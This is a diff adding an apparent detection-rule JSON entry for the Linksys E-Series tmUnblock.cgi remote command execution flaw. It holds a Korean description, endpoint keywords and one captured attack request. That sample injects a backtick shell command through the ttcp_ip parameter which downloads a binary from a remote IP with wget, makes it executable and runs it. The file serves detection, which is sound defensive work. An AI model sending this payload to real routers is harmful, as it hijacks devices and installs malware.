@@ -1,0 +1,9 @@
+{
+        "Name": "Linksys E-Series tmUnblock.cgi RCE",
+        "Description": "-Linksys E-Series는 Block 관련된 파일이 존재\n-Block 파일에 존재하는 ttcp_ip 파라미터는 인증되지 않은 외부의 URL을 삽입",
+        "References": [],
+        "Samples": ["POST /tmUnblock.cgi HTTP/1.1\nHost: 194.180.224.124:80\nConnection: keep-alive\nAccept-Encoding: gzip, deflate\nAccept: /\nUser-Agent: python-requests/2.20.0\nContent-Length: 227\nContent-Type: application/x-www-form-urlencoded\n\nttcp_ip=-h+%60cd+%2Ftmp%3B+rm+-rf+mpsl%3B+wget+http%3A%2F%2F194.180.224.124%2Fbins%2Fmpsl%3B+chmod+777+mpsl%3B+.%2Fmpsl+linksys%60&action=&ttcp_num=2&ttcp_size=2&submit_button=&change_action=&commit=0&StartEPI=1"],
+        "Keywords": [["POST","tmBlock.cgi"], ["POST","tmUnblock.cgi"], ["POST","hndBlock.cgi"], ["POST","hndUnblock.cgi"], ["ttcp_ip"]],
+        "Signature":[]
+}
+
